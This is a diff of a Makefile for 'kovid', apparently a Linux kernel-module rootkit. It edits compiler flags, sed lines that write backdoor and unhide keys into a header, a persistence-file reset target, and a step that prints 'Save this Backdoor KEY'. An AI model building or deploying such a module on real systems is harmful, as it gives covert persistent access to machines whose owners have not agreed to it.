@@ -24,10 +24,10 @@ PRCTIMEOUT := 120
 endif
 
 # PROCNAME, /proc/<name> interface.
-COMPILER_OPTIONS := -Wall -DPROCNAME='"$(PROCNAME)"' \
+COMPILER_OPTIONS := -Wall -Wno-vla -DPROCNAME='"$(PROCNAME)"' \
 	-DMODNAME='"kovid"' -DKSOCKET_EMBEDDED ${DEBUG_PR} -DCPUHACK \
-	-DPROCNAME_MAXLEN=256 -DCPUHACK -DPRCTIMEOUT=$(PRCTIMEOUT) \
-	-DUUIDGEN=\"$(UUIDGEN)\" -DJOURNALCTL=\"$(JOURNALCTL)\"
+	-DCPUHACK -DPRCTIMEOUT=$(PRCTIMEOUT) -DUUIDGEN=\"$(UUIDGEN)\" \
+	-DJOURNALCTL=\"$(JOURNALCTL)\"
 
 EXTRA_CFLAGS := -I$(src)/src -I$(src)/fs ${COMPILER_OPTIONS}
 
@@ -42,12 +42,12 @@ obj-m := ${OBJNAME}.o
 
 CC=gcc
 
-all: persist
+all:
 	# TODO: Check if we can generate a random PROCNAME, something like:
 	# PROCNAME ?= $(shell uuidgen | cut -c1-8)
 	$(if $(PROCNAME),,$(error ERROR: PROCNAME is not defined. Please invoke make with PROCNAME="your_process_name"))
-	sed -i 's/^static uint64_t auto_bdkey = .*/static uint64_t auto_bdkey = $(BDKEY);/' src/auto.h
-	sed -i 's/^static uint64_t auto_unhidekey = .*/static uint64_t auto_unhidekey = $(UNHIDEKEY);/' src/auto.h
+	@sed -i 's#^static uint64_t __attribute__((unused)) auto_bdkey = .*#static uint64_t __attribute__((unused)) auto_bdkey = $(BDKEY);#' src/auto.h
+	@sed -i 's#^static uint64_t __attribute__((unused)) auto_unhidekey = .*#static uint64_t __attribute__((unused)) auto_unhidekey = $(UNHIDEKEY);#' src/auto.h
 	make  -C  /lib/modules/$(shell uname -r)/build M=$(PWD) modules
 	@echo -n "Save this Backdoor KEY: "
 	@echo $(BDKEY) | sed 's/^0x//'
@@ -72,13 +72,15 @@ strip:
 clang-format:
 	clang-format-18 -i src/*.[ch]
 
-clean:
-	@make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
-	@rm -f *.o src/*.o $(persist)
+reset-auto:
 	@git checkout a6333fdc9e9d647b7d64e9e9cb1e6c0237a8967f \
 		-- src/persist.S 2>/dev/null || true
-	@git checkout a9d711472292ad23c284f701fc8848f2947cc224 \
+	@git checkout 1520b99c4fa2fc2ee6a1d11c50de4e1591321a71 \
 		-- src/auto.h 2>/dev/null || true
+
+clean: reset-auto
+	@make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+	@rm -f *.o src/*.o $(persist)
 	@echo "Clean."
 
 tags:
